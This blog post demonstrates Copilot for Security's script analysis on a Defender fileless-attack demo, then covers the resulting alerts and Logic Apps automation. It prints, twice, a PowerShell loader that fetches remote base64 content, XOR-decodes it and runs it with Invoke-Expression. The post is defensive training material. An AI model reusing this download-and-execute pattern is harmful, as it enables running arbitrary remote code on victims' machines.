---
title: "Copilot for Security - script analysis integration" 
categories:
  - Security Copilot
---

Copilot for Security is great: among the many capabilities it offers (KQL query in natural language, incident summary and reporting, Threat Hunting with Threat Intelligence etc) it also allows you to analyze scripts! This can be useful from a purely descriptive perspective - what a script performs - but also from a security perspective, especially if the script is voluntarily obfuscated/encoded by the attacker.

As we know - ref. to previous blog [post](https://mccybersec.github.io/security%20copilot/what-is-security-copilot/) - Copilot for Security can be used in two ways:
- embedded experience: Copilot for Security features within the various Microsoft Security tools that can be quickly recalled to speed up investigation and analysis.
- standalone portal: the official Copilot for Security portal where it is possible to connect information from different sources from a single central hub

Let's take a practical example scenario. <br>
The following is an example of a fileless attack (don't worry, it just opens a notepad.exe).

```powershell
[Net.ServicePointManager]::SecurityProtocol= [Net.SecurityProtocolType]::Tls12;

$xor= [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');
$base64String = (Invoke-WebRequest -URI https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/WinATP-Intro-Fileless.txt -UseBasicParsing).Content;
Try{
	$contentBytes= [System.Convert]::FromBase64String($base64String)
} Catch { 
	$contentBytes= [System.Convert]::FromBase64String($base64String.Substring(3)) 
};

$i = 0;
$decryptedBytes= @();

$contentBytes.foreach{
	$decryptedBytes+= $_ -bxor$xor[$i];
	$i++;
	if ($i -eq$xor.Length) {
		$i = 0
	}
};

Invoke-Expression([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
```

If the script is run on a device protected by Defender for Endpoint an incident in Defender XDR is raised - and depending on how the device is defined, self-investigation and remediation may occur.

> **Suspicious process injection observed on one endpoint**


But...what if you are a junior cybersecurity analyst and need to understand what the script does?<br>
No problem, ask Copilot for Security! <br>
With the [_Analyze Script_](https://learn.microsoft.com/en-us/microsoft-365/security/defender/security-copilot-m365d-script-analysis?view=o365-worldwide) capability of Copilot for Security you can get information directly in the Defender portal or you can create a new session in the standalone experience.

Here are two prompts - part of a longer promptbook - to run to get insights about the script

### PROMPT 1 
> _The following script was found as part of a potential security incident. Explain what this script does step by step and infer the intent. Also note any actions expressed that could be malicious in nature, including destructive activities, stealing of information, or changing of sensitive settings:_<br><br>
[Net.ServicePointManager]::SecurityProtocol= [Net.SecurityProtocolType]::Tls12; $xor= [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection'); $base64String = (Invoke-WebRequest -URI https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/WinATP-Intro-Fileless.txt -UseBasicParsing).Content; Try{ $contentBytes= [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes= [System.Convert]::FromBase64String($base64String.Substring(3)) }; $i = 0; $decryptedBytes= @(); $contentBytes.foreach{ $decryptedBytes+= $_ -bxor$xor[$i]; $i++; if ($i -eq$xor.Length) { $i = 0 } }; Invoke-Expression([System.Text.Encoding]::UTF8.GetString($decryptedBytes))

##### RESPONSE
The provided PowerShell script performs several actions to download encrypted content from a specific URL, decrypt it using a XOR cipher with the key 'WinATP-Intro-Injection', and then execute the decrypted content. The script uses TLS 1.2 for secure communication and handles potential errors during the base64 decoding process. The decrypted content is likely to be a PowerShell script or commands. Here's a step-by-step breakdown:

1. The script sets the security protocol for the current session to TLS 1.2. This is a standard security practice to ensure secure communication.
2. It then defines a byte array $xor from the UTF8 encoding of the string 'WinATP-Intro-Injection'. This string is used as a key for the XOR cipher.
3. The script makes a web request to the URL and stores the content in $base64String. The content is expected to be a base64 encoded string.
4. It attempts to convert the content from base64 to a byte array. If the conversion fails, it tries again by skipping the first three characters of the base64 string. This is a common error handling technique for base64 decoding.
5. The script then performs a bitwise XOR operation on each byte in the content with a corresponding byte in the $xor array, effectively decrypting the content.
6. Finally, it converts the decrypted bytes back to a string and executes it. This is where the potential malicious activity could occur, as the decrypted content is executed without any validation or checks.

The intent of this script appears to be to download and execute a potentially malicious script from a remote server. The use of encryption and error handling suggests a level of sophistication and intent to evade detection. The actual maliciousness of the script would depend on the content that is downloaded and executed. Without that information, it's impossible to definitively say what the script does beyond its decryption and execution activities.

### PROMPT 2 
> _Is this script malicious?_

##### RESPONSE
The script you provided is potentially malicious, depending on the content it downloads and executes. The script itself is designed to download a file from a specific URL, decrypt it using a XOR cipher, and then execute the decrypted content. This behavior is often associated with malicious scripts as it allows an attacker to execute arbitrary code on a compromised system

---

If the device is also protected by Defender for Cloud for Server, various alerts may appear on the portal, such as
> **Detected encoded executable in command line data** <br>
> **Fileless attack behavior detected** <br>
> **Fileless attack technique detected** <br>

But... Defender for Cloud allows you to initiate response flows to alerts raised in your environment with the use of Logic Apps. Why not immediately inform the SOC of this alert via email - with an email containing the insights given by Copilot for Security , automatically and without manual actions?
It's possible thanks to the Logic Apps Copilot for Security [connector](https://learn.microsoft.com/en-us/connectors/securitycopilot/)!

![Script Analysis Workflow Defender for Cloud and Logic App](/assets/images/scriptanalysis.png)


For more information don't hesitate to contact me!<br>
Thank you for taking time to read.

Stay tuned!<br>
_Mario_